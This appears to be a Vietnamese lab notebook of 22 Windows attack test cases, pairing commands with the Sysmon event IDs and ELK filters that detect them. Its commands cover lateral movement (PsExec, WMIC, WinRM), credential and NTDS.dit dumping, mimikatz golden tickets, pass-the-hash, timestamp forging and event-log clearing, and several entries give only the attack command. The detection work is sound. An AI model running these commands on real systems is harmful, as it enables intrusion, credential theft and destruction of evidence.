# Tổng hợp tấn công

## Test case 1: PsExec
* Command: `[Đường dẫn tới file psexec] \\[IP victim] -u [Username] -p [Password] [Thông thường sẽ là cmd.exe]`
* Ví dụ: `PsExec64.exe \\192.168.255.100 -u WINSRV2008\sv -p 123456sv. cmd/whoami`
* Bằng chứng thực thi: Tại đích chương trình PSEXESVC.exe được cài đặt.
  * **Event ID 11** tại Sysmon Event Log: `TargetFileName: C:\Windows\PSEXESVC.exe`
  * Hoặc **Event ID 704588 tại System Event Log: `Service File Name: %SystemRoot%\PSEXESVC.exe`
* Chuyển sang dạng filter trong ELK:
  * `event.code: 7045`
  * `winlog.event_data.ImagePath: %SystemRoot%\PSEXESVC.exe`


## Test case 2: Powershell Empire
* Tạo macro:
```
usestager windows/macro
set Listener [Tên listener]
execute
```
* Sau đó macro sẽ được lưu trữ tại /tmp/macro. Copy nội dung này và paste vào file word.
* Bằng chứng thực thi: Sử dụng powershell nên sẽ sinh ra 2 sự kiện là **Event ID 11** tại Sysmon Log và **Event ID 400** tại Windows Powershell Event Log. Nội dung phần Host Application luôn bắt đầu bởi **powershell -noP -sta -w 1 -enc**
* Chuyển sang dạng filter trong ELK
  * `winlog.event_id: 400`
  * `winlog.event_data.param3: powershell -noP -sta -w 1 -enc`


## Test case 3: WinRM
* Command:
```
$cred = Get-Credential WINSRV2008\sv
Connect-WSMan -ComputerName "winsrv" -Credential $cred
cd wsman:
Hoặc Command Execution:
Invoke-Command -ComputerName "winsrv" -ScriptBlock { Get-ChildItem C:\ } -Credential $cred
```
* Bằng chứng thực thi:
  * **Event ID 4656** tại Security: (A handle to an object was requested)
  * `Process Name: C:\Windows\System32\wsmprovhost.exe`
  * `Object Name: \REGISTRY\MACHINE\SOFTWARE\MICROSOFT\Windows\CurrentVersion\WSMAN`
  
* Chuyển sang dạng filter trong ELK:
  * `event.code: 1`
  * `winlog.event_data.ProcessName: C:\Windows\System32\wsmprovhost.exe`
  * `winlog.event_data.ObjectName: \REGISTRY\\MACHINE\SOFTWARE\MICROSOFT\Windows\CurrentVersion\WSMAN`

## Test case 4: WinRS
* Command: `winrs -r:http://WINSRV:5985 -u:winsrv2008.local\administrator "cmd"`
* Bằng chứng thực thi:
  * **Event ID 1** tại Sysmon: (Process created): Sự đăng nhập từ xa của WinRS
  * `Image: C:\Windows\System32\winrshost.exe`
* Chuyển sang dạng filter trong ELK
  * `event.code: 1`
  * `process.executable: C:\Windows\System32\winrshost.exe`


## Test case 5: WMIC
* Command: `wmic /node:IP /user:[domain]\[Tài khoản Victim] /password:[Password của Victim] [Lệnh]`
* Ví dụ: `wmic /node:192.168.255.100 /user:WINSRV2008\administrator /password:123abc!!! process call create "cmd.exe /c net user hacker /add"`
* Bằng chứng thực thi: **Event ID 1** tại Sysmon Event Log: (Process Create): Tiến trình WmiPrvSE.exe khởi động chứng tỏ có một phiên WMIC được tiến hành từ xa và sau đó là các lệnh thực thi được ghi lại tại Sysmon Event Log
* Chuyển sang dạng filter trong ELK:
  * `event.code: 1`
  * `process.parent.executable: C:\Windows\System32\wbem\WmiPrvSE.exe`


## Test case 6: wmiexec.vbs
* Command: `wscript.exe //nologo wmiexec.vbs [Mode] Host Username Password`
* Ví dụ: `wscript.exe //nologo wmiexec.vbs /cmd 192.168.255.100 administrator 123abc!!! "net user"`
* Bằng chứng thực thi: 
  * **Event ID 1** tại Sysmon Event Log: (Process Create): Sự thực thi tiến trình WmiPrvSE.exe chứng tỏ có phiên WMI từ xa
  * **Event ID 11** tại Sysmon Event Log: (File Created) Sự tạo thành file wmi.dll
  * **Event ID 1** tại Sysmon Event Log: (Process Create) Xóa file wmi.dll
* Chuyển sang dạng filter trong ELK như sau:
  * Sự kiện xóa:
    * `event.code: 1`
    * `process.parent.executable: C:\Windows\System32\wbem\WmiPrvSE.exe`
    * `process.args: "C:\windows\temp\wmi.dll", "del"`


## Test case 7: PwDump7
* Command: Chạy dưới quyền admin: `.\PwDump7.exe`
* Bằng chứng thực thi:
  * **Event ID 11** tại Sysmon: (File Created): Khi chạy Pwdump7, chúng luôn gọi đến file "libeay32.dll". Nếu tên file Pwdump7 có thể thay đổi thì tên file libeay32.dll khó thay đổi hơn vì Pwdump7 đã được biên dịch thành file exe để thực thi, nếu muốn đổi ta phải code lại chúng. Giải pháp tạm thời này có thể phát hiện phần nào các tấn công sử dụng tool PwDump7, vì hiện tại rất khó để phát hiện chúng
    * `TargetFilename: libeay32.dll`

* Chuyển sang dạng filter trong ELK
  * `event.code: 11`
  * `file.path: libeay32.dll`
  * Hoặc
  * `event.code: 4663`
  * `winlog.event_data.ObjectName: libeay32.dll`
  * `message: Accesses: Execute/Traverse`


## Test case 8: Quarks PwDump
* Command: 
```
.\QuarksPwDump.exe
quarkspwdump.exe --dump-hash-domain-cached
```


## Test case 9: WCE Password and Hash dump
* Command: `.\wce64.exe`


## Test case 10: WCE Remote Login
* Command: `.\wce64.exe -s [UserAccount]:[Domain]:[NTLM]`
* Ví dụ: `.\wce64.exe -s sv:WINSRV2008:00000000000000000000000000000000:130B0F15BFF820D1DFDE026CD3554719`

## Test case 11: Golden Ticket
* Command:
  * Vào mimikatz: `.\mimikatz.exe`
  * Lấy NTLM của Krbtgt: `lsadump::dcsync /domain:dc01.local /user:krbtgt`
  * Tiến hành tạo ticket và pass-the-ticket này vào current logon session: `kerberos::golden /domain:winsrv2008.local /sid:S-1-5-21-4220747943-3152432350-320651364 /rc4:e7111664b88b4b058010fde4aa37fec1 /id:500 /user:FakeAdmin /ptt`
  * Có thể sử dụng misc::cmd để mở một cmd mới hoặc exit rồi sử dụng cmd hiện tại. Pass-the-hash:
   * `net use O: \\winsrv\c$`
   * `pushd \\winsrv\c$`
   * `.\PsExec64.exe \\winsrv cmd`

## Test case 12: AT Command
* Command: `at.exe \\192.168.255.100 10:00 cmd /c ping 8.8.8.8`


## Test case 13: RDP
## Test case 14: Mimikatz
## Test case 15: Bypass UAC
## Test case 16: ntdsutil
* Command: `ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q`
* Bằng chứng thực thi
  * **Event ID 8222** tại Security Log: Phát hiện sự thực thi của ntdsutil.exe
  * **Event ID 216** tại Application and Service Log: Phát hiện sự sao chép tập tin C:\Windows\NTDS\ntds.dit (Có ghi rõ điểm đến)
  * **Event ID 1** tại Sysmon: Phát hiện sự thực thi của ntdsutil.exe
    * `Image: C:\Windows\System32\ntdsutil.exe`
* Chuyển sang dạng filter trong ELK:
  * `event.code: 1`
  * `process.executable: C:\Windows\System32\ntdsutil.exe`


## Test case 17: vssadmin
* Command: Chạy command line dưới quyền admin và thư mục được tạo shadow copy phải có sẵn
```
vssadmin.exe create shadow /for=C: 2>&1 
cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\vssadmin\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\vssadmin\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\vssadmin\
```
* Bằng chứng thực thi:
  * **Event ID 1** tại Sysmon Event Log: (Process Create): Sự thực thi của vssadmin
    * `CommandLine: C:\Windows\System32\vssadmin.exe`
* Chuyển sang dạng filter trong ELK
  * `event.code: 1`
  * `process.executable: C:\Windows\System32\vssadmin.exe `

## Test case 18: net user
## Test case 19: csvde
* Command: `.\csvde.exe -f [filename] -s [hostname/IP] -r objectClass=user -b [UserAccount] [Domain] [Password]`
* Ví dụ: `.\csvde.exe -f C:\Users\sv\Desktop\adusers.csv -s 192.168.255.100 -r objectClass=user -b sv WINSRV2008 123456sv.`

## Test case 20: ldifde
* Command: `ldifde.exe -f [filename] -s [hostname/IP] -b [UserAccount] [Domain] [Password]` 
* Ví dụ: `ldifde.exe -f adusers.ldif -s 192.168.255.100 -b sv WINSRV2008 123456sv.`

## Test case 21: timestomp
* Command: `timestomp -z “timestamp” [filename]` 
* Ví dụ: `timestomp -z “01/01/2000 09:09:09” credentials.txt`


## Test case 22: wevtutil
* Command: `wevtutl cl [Tên log]`
* Ví dụ: `wevtutil cl application`
